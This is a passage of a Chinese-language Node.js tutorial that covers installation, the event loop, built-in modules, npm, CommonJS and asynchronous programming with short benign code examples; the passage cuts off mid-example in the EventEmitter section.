title="7. 测试与调试"></a>7. 测试与调试</h2><ul><li><p><a href="#71-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E4%B8%8E%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95">7.1 单元测试与集成测试</a></p><ul><li><a href="#711-%E4%BD%BF%E7%94%A8-mocha-%E8%BF%9B%E8%A1%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95">7.1.1 使用 Mocha 进行单元测试</a></li><li><a href="#712-%E4%BD%BF%E7%94%A8-chai-%E8%BF%9B%E8%A1%8C%E6%96%AD%E8%A8%80">7.1.2 使用 Chai 进行断言</a></li><li><a href="#713-%E6%B5%8B%E8%AF%95%E5%BC%82%E6%AD%A5%E4%BB%A3%E7%A0%81">7.1.3 测试异步代码</a></li></ul></li><li><p><a href="#72-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2 调试 Node.js 应用</a></p><ul><li><a href="#721-%E4%BD%BF%E7%94%A8-consolelog-%E8%B0%83%E8%AF%95">7.2.1 使用 <code>console.log</code> 调试</a></li><li><a href="#722-%E4%BD%BF%E7%94%A8-nodejs-%E5%86%85%E7%BD%AE%E8%B0%83%E8%AF%95%E5%99%A8">7.2.2 使用 <code>Node.js</code> 内置调试器</a></li><li><a href="#723-%E4%BD%BF%E7%94%A8-vs-code-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2.3 使用 <code>VS Code</code> 调试 Node.js 应用</a></li></ul></li></ul><h2 id="8-部署与性能优化"><a href="#8-部署与性能优化" class="headerlink" title="8. 部署与性能优化"></a>8. 部署与性能优化</h2><ul><li><p><a href="#81-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1 部署 Node.js 应用</a></p><ul><li><a href="#811-%E4%BD%BF%E7%94%A8-pm2-%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86">8.1.1 使用 <code>PM2</code> 进行进程管理</a></li><li><a href="#812-docker-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1.2 Docker 部署 Node.js 应用</a></li><li><a href="#813-%E5%9C%A8%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B8%8A%E9%83%A8%E7%BD%B2-nodejs">8.1.3 在云平台上部署 Node.js</a></li></ul></li><li><p><a href="#82-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E4%B8%8E%E7%BC%93%E5%AD%98">8.2 性能优化与缓存</a></p><ul><li><a href="#821-%E4%BD%BF%E7%94%A8-redis-%E7%BC%93%E5%AD%98">8.2.1 使用 Redis 缓存</a></li><li><a href="#822-%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E4%B8%8E%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6">8.2.2 内存优化与垃圾回收</a></li><li><a href="#823-%E4%BD%BF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD">8.2.3 使用集群模式提高性能</a></li></ul></li></ul><h2 id="9-安全性"><a href="#9-安全性" class="headerlink" title="9. 安全性"></a>9. 安全性</h2><ul><li><p><a href="#91-%E5%AE%89%E5%85%A8%E6%80%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">9.1 安全性最佳实践</a></p><ul><li><a href="#911-%E9%98%B2%E6%AD%A2%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">9.1.1 防止注入攻击</a></li><li><a href="#912-%E9%98%B2%E6%AD%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss">9.1.2 防止跨站脚本攻击 (XSS)</a></li><li><a href="#913-%E4%BD%BF%E7%94%A8-helmetjs-%E4%BF%9D%E6%8A%A4%E5%BA%94%E7%94%A8">9.1.3 使用 <code>helmet.js</code> 保护应用</a></li></ul></li><li><p><a href="#92-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83">9.2 身份验证与授权</a></p><ul><li><a href="#921-%E4%BD%BF%E7%94%A8-jwt-%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">9.2.1 使用 JWT 进行身份验证</a></li><li><a href="#922-oauth-%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E5%BD%95%E9%9B%86%E6%88%90">9.2.2 OAuth 与第三方登录集成</a></li></ul></li><li><p><a href="#93-ssl-%E4%B8%8E-https">9.3 SSL 与 HTTPS</a></p><ul><li><a href="#931-%E7%94%9F%E6%88%90%E4%B8%8E%E9%85%8D%E7%BD%AE-ssl-%E8%AF%81%E4%B9%A6">9.3.1 生成与配置 SSL 证书</a></li><li><a href="#932-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97">9.3.2 使用 <code>https</code> 模块</a></li></ul></li></ul><h2 id="10-实战项目"><a href="#10-实战项目" class="headerlink" title="10. 实战项目"></a>10. 实战项目</h2><ul><li><p><a href="#101-%E6%9E%84%E5%BB%BA-restful-api">10.1 构建 RESTful API</a></p><ul><li><a href="#1011-restful-api-%E5%9F%BA%E7%A1%80">10.1.1 RESTful API 基础</a></li><li><a href="#1012-%E4%BD%BF%E7%94%A8-express-%E6%9E%84%E5%BB%BA-api">10.1.2 使用 Express 构建 API</a></li></ul></li><li><p><a href="#102-%E5%AE%9E%E7%8E%B0-websocket-%E9%80%9A%E4%BF%A1">10.2 实现 WebSocket 通信</a></p><ul><li><a href="#1021-websocket-%E5%9F%BA%E7%A1%80">10.2.1 WebSocket 基础</a></li><li><a href="#1022-%E4%BD%BF%E7%94%A8-ws-%E5%AE%9E%E7%8E%B0-websocket-%E6%9C%8D%E5%8A%A1">10.2.2 使用 <code>ws</code> 实现 WebSocket 服务</a></li></ul></li><li><p><a href="#103-%E4%BD%BF%E7%94%A8-graphql-%E6%9E%84%E5%BB%BA-api">10.3 使用 GraphQL 构建 API</a></p><ul><li><p><a href="#1031-graphql-%E6%A6%82%E8%BF%B0">10.3.1 GraphQL 概述</a></p></li><li><p><a href="#1032-%E4%BD%BF%E7%94%A8-apollo-server-%E6%9E%84%E5%BB%BA-graphql-api">10.3.2 使用 Apollo Server 构建 GraphQL API</a></p></li></ul></li></ul><h3 id="1-1-什么是-Node-js"><a href="#1-1-什么是-Node-js" class="headerlink" title="1.1 什么是 Node.js"></a>1.1 什么是 Node.js</h3><p>Node.js 是一个基于 <strong>Chrome V8 JavaScript 引擎</strong> 构建的 JavaScript 运行环境。它允许开发者使用 JavaScript 编写后端代码，因此前后端可以共享同一种语言。Node.js 主要用于开发网络服务器、实时应用程序、命令行工具等，具有以下特点：</p><ul><li><strong>事件驱动</strong>：Node.js 的事件驱动架构使其能够高效地处理并发连接。</li><li><strong>异步非阻塞 I&#x2F;O</strong>：通过异步处理，Node.js 可以在不阻塞程序执行的情况下处理 I&#x2F;O 操作（文件系统、网络请求等）。</li><li><strong>单线程模型</strong>：尽管 Node.js 是单线程的，但它通过事件循环和异步编程支持高并发处理。</li></ul><h3 id="1-2-Node-js-安装与配置"><a href="#1-2-Node-js-安装与配置" class="headerlink" title="1.2 Node.js 安装与配置"></a>1.2 Node.js 安装与配置</h3><h4 id="1-2-1-在不同平台上安装-Node-js"><a href="#1-2-1-在不同平台上安装-Node-js" class="headerlink" title="1.2.1 在不同平台上安装 Node.js"></a>1.2.1 在不同平台上安装 Node.js</h4><ul><li><strong>Windows</strong>：访问 <a href="https://nodejs.org/">Node.js 官网</a> 下载适合你的安装包，并运行安装程序。</li><li><strong>macOS</strong>：使用 Homebrew 安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install node<br></code></pre></td></tr></table></figure></li><li><strong>Linux</strong>：通过包管理器安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install nodejs npm<br></code></pre></td></tr></table></figure></li></ul><h4 id="1-2-2-验证安装"><a href="#1-2-2-验证安装" class="headerlink" title="1.2.2 验证安装"></a>1.2.2 验证安装</h4><p>在终端中输入以下命令，确保 Node.js 和 npm 安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure><h3 id="1-3-Node-js-运行机制与事件循环"><a href="#1-3-Node-js-运行机制与事件循环" class="headerlink" title="1.3 Node.js 运行机制与事件循环"></a>1.3 Node.js 运行机制与事件循环</h3><p>Node.js 使用 <strong>事件驱动</strong> 和 <strong>非阻塞 I&#x2F;O 模型</strong> 来处理高并发。它基于 <strong>单线程</strong> 处理所有的请求，通过事件循环管理异步操作。</p><h4 id="1-3-1-事件循环的工作原理"><a href="#1-3-1-事件循环的工作原理" class="headerlink" title="1.3.1 事件循环的工作原理"></a>1.3.1 事件循环的工作原理</h4><p>事件循环是 Node.js 的核心，它允许 Node.js 处理异步 I&#x2F;O 操作而不阻塞主线程。每次异步操作被注册到事件循环中，当 I&#x2F;O 操作完成时，相关的回调函数会被放入任务队列，等待事件循环调度执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Inside Timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;End&#x27;</span>);<br><br><span class="hljs-comment">// 输出顺序：</span><br><span class="hljs-comment">// Start</span><br><span class="hljs-comment">// End</span><br><span class="hljs-comment">// Inside Timeout</span><br></code></pre></td></tr></table></figure><h3 id="1-4-Node-js-与-JavaScript-的区别"><a href="#1-4-Node-js-与-JavaScript-的区别" class="headerlink" title="1.4 Node.js 与 JavaScript 的区别"></a>1.4 Node.js 与 JavaScript 的区别</h3><p>Node.js 和 JavaScript 都使用同样的语言语法，但它们的运行环境和使用场景不同：</p><ul><li><strong>JavaScript</strong> 主要运行在浏览器中，用于操控 DOM 和处理前端交互。</li><li><strong>Node.js</strong> 运行在服务器端，用于构建后端应用程序和处理 I&#x2F;O 操作。</li></ul><p>Node.js 提供了许多 JavaScript 在浏览器中没有的模块，如 <code>fs</code> (文件系统模块)、<code>http</code> (HTTP 模块)、<code>net</code> (网络模块) 等。</p><hr><h2 id="2-模块与包管理-1"><a href="#2-模块与包管理-1" class="headerlink" title="2. 模块与包管理"></a>2. 模块与包管理</h2><h3 id="2-1-Node-js-内置模块"><a href="#2-1-Node-js-内置模块" class="headerlink" title="2.1 Node.js 内置模块"></a>2.1 Node.js 内置模块</h3><p>Node.js 提供了一系列内置模块，允许开发者处理常见的任务，如文件操作、网络请求等。</p><h4 id="2-1-1-fs-文件系统模块"><a href="#2-1-1-fs-文件系统模块" class="headerlink" title="2.1.1 fs 文件系统模块"></a>2.1.1 <code>fs</code> 文件系统模块</h4><p><code>fs</code> 模块用于处理文件系统的操作，包括读取、写入文件和管理文件夹。</p><p><strong>读取文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-1-2-http-模块"><a href="#2-1-2-http-模块" class="headerlink" title="2.1.2 http 模块"></a>2.1.2 <code>http</code> 模块</h4><p><code>http</code> 模块用于创建 HTTP 服务器和处理请求&#x2F;响应。</p><p><strong>创建简单的 HTTP 服务器：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-1-3-path-模块"><a href="#2-1-3-path-模块" class="headerlink" title="2.1.3 path 模块"></a>2.1.3 <code>path</code> 模块</h4><p><code>path</code> 模块用于处理和规范化文件路径。</p><p><strong>获取文件的扩展名：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> ext = path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ext); <span class="hljs-comment">// 输出: .txt</span><br></code></pre></td></tr></table></figure><h4 id="2-1-4-os-模块"><a href="#2-1-4-os-模块" class="headerlink" title="2.1.4 os 模块"></a>2.1.4 <code>os</code> 模块</h4><p><code>os</code> 模块提供与操作系统相关的实用函数和属性。</p><p><strong>获取系统的内存信息：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Total Memory: <span class="hljs-subst">$&#123;os.totalmem()&#125;</span> bytes`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Free Memory: <span class="hljs-subst">$&#123;os.freemem()&#125;</span> bytes`</span>);<br></code></pre></td></tr></table></figure><h4 id="2-1-5-crypto-模块"><a href="#2-1-5-crypto-模块" class="headerlink" title="2.1.5 crypto 模块"></a>2.1.5 <code>crypto</code> 模块</h4><p><code>crypto</code> 模块提供了加密操作的功能，用于生成哈希、加密和解密数据。</p><p><strong>生成 SHA256 哈希：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> hash = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>).<span class="hljs-title function_">update</span>(<span class="hljs-string">&#x27;password&#x27;</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash);<br></code></pre></td></tr></table></figure><h3 id="2-2-使用-NPM-和包管理"><a href="#2-2-使用-NPM-和包管理" class="headerlink" title="2.2 使用 NPM 和包管理"></a>2.2 使用 NPM 和包管理</h3><p>NPM 是 Node.js 的包管理器，允许开发者安装、管理和分享第三方库。</p><h4 id="2-2-1-NPM-的安装和使用"><a href="#2-2-1-NPM-的安装和使用" class="headerlink" title="2.2.1 NPM 的安装和使用"></a>2.2.1 NPM 的安装和使用</h4><p>在安装 Node.js 时，NPM 会自动安装。你可以使用以下命令检查是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm -v<br></code></pre></td></tr></table></figure><h4 id="2-2-2-管理项目依赖"><a href="#2-2-2-管理项目依赖" class="headerlink" title="2.2.2 管理项目依赖"></a>2.2.2 管理项目依赖</h4><p><strong>安装依赖包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure><p><strong>卸载依赖包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm uninstall express<br></code></pre></td></tr></table></figure><h4 id="2-2-3-版本控制与语义化版本"><a href="#2-2-3-版本控制与语义化版本" class="headerlink" title="2.2.3 版本控制与语义化版本"></a>2.2.3 版本控制与语义化版本</h4><p>NPM 使用语义化版本控制 (SemVer)，版本号格式为 <code>MAJOR.MINOR.PATCH</code>：</p><ul><li><strong>MAJOR</strong>：有重大更改或破坏兼容性时增加。</li><li><strong>MINOR</strong>：添加新功能但不破坏兼容性时增加。</li><li><strong>PATCH</strong>：修复 bug 且不破坏兼容性时增加。</li></ul><h4 id="2-2-4-使用-package-json-管理项目"><a href="#2-2-4-使用-package-json-管理项目" class="headerlink" title="2.2.4 使用 package.json 管理项目"></a>2.2.4 使用 <code>package.json</code> 管理项目</h4><p><code>package.json</code> 是 Node.js 项目配置文件，用于定义项目的依赖、脚本、版本号等。</p><p><strong>生成 <code>package.json</code> 文件：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm init<br></code></pre></td></tr></table></figure><p><strong>示例 <code>package.json</code> 文件：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-app&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node app.js&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;express&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-3-自定义模块与-CommonJS-规范"><a href="#2-3-自定义模块与-CommonJS-规范" class="headerlink" title="2.3 自定义模块与 CommonJS 规范"></a>2.3 自定义模块与 CommonJS 规范</h3><h4 id="2-3-1-导入与导出模块"><a href="#2-3-1-导入与导出模块" class="headerlink" title="2.3.1 导入与导出模块"></a>2.3.1 导入与导出模块</h4><p>Node.js 遵循 <strong>CommonJS 模块规范</strong>，通过 <code>module.exports</code> 导出模块，通过 <code>require</code> 导入模块。</p><p><strong>导出模块：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// file: math.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">subtract</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b;<br></code></pre></td></tr></table></figure><p><strong>导入模块：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>));  <span class="hljs-comment">// 输出: 5</span><br></code></pre></td></tr></table></figure><h4 id="2-3-2-CommonJS-和-ES6-模块的区别"><a href="#2-3-2-CommonJS-和-ES6-模块的区别" class="headerlink" title="2.3.2 CommonJS 和 ES6 模块的区别"></a>2.3.2 CommonJS 和 ES6 模块的区别</h4><ul><li><strong>CommonJS</strong> 是 Node.js 的默认模块系统，使用 <code>require</code> 和 <code>module.exports</code>。</li><li><strong>ES6 模块</strong> 使用 <code>import</code> 和 <code>export</code> 语法，在 Node.js 中也逐渐被支持，需要在 <code>package.json</code> 中添加 <code>&quot;type&quot;: &quot;module&quot;</code>。</li></ul><hr><h2 id="3-异步编程-1"><a href="#3-异步编程-1" class="headerlink" title="3. 异步编程"></a>3. 异步编程</h2><h3 id="3-1-异步编程基础"><a href="#3-1-异步编程基础" class="headerlink" title="3.1 异步编程基础"></a>3.1 异步编程基础</h3><p>Node.js 的异步编程是其核心特点，允许程序在执行耗时任务时继续处理其他任务。</p><h4 id="3-1-1-回调函数"><a href="#3-1-1-回调函数" class="headerlink" title="3.1.1 回调函数"></a>3.1.1 回调函数</h4><p>回调函数是最基础的异步处理方式，将一个函数作为参数传递给另一个函数，在异步任务完成后调用该回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="3-1-2-Promise-对象"><a href="#3-1-2-Promise-对象" class="headerlink" title="3.1.2 Promise 对象"></a>3.1.2 <code>Promise</code> 对象</h4><p><code>Promise</code> 是一种更现代的异步处理方式，可以避免回调地狱问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));<br></code></pre></td></tr></table></figure><h4 id="3-1-3-async-await-语法"><a href="#3-1-3-async-await-语法" class="headerlink" title="3.1.3 async/await 语法"></a>3.1.3 <code>async/await</code> 语法</h4><p><code>async/await</code> 是基于 <code>Promise</code> 的语法糖，能够以同步的写法处理异步任务。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-params"></span>) &#123;<br> <br><br> <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">readFile</span>();<br></code></pre></td></tr></table></figure><h3 id="3-2-事件驱动编程"><a href="#3-2-事件驱动编程" class="headerlink" title="3.2 事件驱动编程"></a>3.2 事件驱动编程</h3><p>Node.js 的事件驱动编程通过 <strong>事件循环</strong> 和 <strong>事件发射器</strong> (<code>EventEmitter</code>) 实现。</p><h4 id="3-2-1-使用-EventEmitter"><a href="#3-2-1-使用-EventEmitter" class="headerlink" title="3.2.1 使用 EventEmitter"></a>3.2.1 使用 <code>EventEmitter</code></h4><p><code>EventEmitter</code> 是 Node.js 的核心类，用于创建和监听事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;events&#x27;</span>);<br><span class="hljs-keyword">const</span> emitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventEmitter</span>();<br><br>emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;event&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Event has occurred!&#x27;</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;event&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="3-2-2-自定义事件处理"><a href="#3-2-2-自定义事件处理" class="headerlink" title="3.2.2 自定义事件处理"></a>3.2.2 自定义事件处理</h4><p>你可以自定义事件，事件可以传递参数供监听器处理。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">name</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span 